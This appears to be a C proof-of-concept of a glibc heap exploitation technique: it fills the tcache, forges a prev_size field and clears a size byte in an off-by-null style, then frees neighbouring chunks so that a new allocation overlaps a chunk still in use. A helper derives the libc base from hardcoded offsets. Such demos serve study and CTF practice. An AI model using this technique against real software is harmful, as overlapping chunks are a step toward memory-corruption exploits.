#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x79e60;
    size_t* mp_72=libc_addr+0x1f23c0;
    size_t heap=*mp_72;
    return heap;
}

int main()
{    
    char* chunkarray[0x10];
    //size_t heap=getheap();
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0xf8);
    }
    char* chunk1=malloc(0xf8);
    char* chunk2=malloc(0xf8);
    char* chunk3=malloc(0xf8);
    malloc(0x10);
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    
    
    *(size_t*)(&chunk2[0xf0])=0x200; //prev_size
    chunk2[0xf8]=0;  // chunk2 size low byte
    free(chunk1);
    free(chunk3);
    char* chunk4=malloc(0x2f0);

    printf("chunk4 data begin %p \n",chunk4);
    printf("chunk4 size %p \n",*(size_t*)(chunk4-8));
    printf("chunk2  %p \n",chunk2);
    printf("&chunk4[0x100] %p \n",&chunk4[0x100]);

}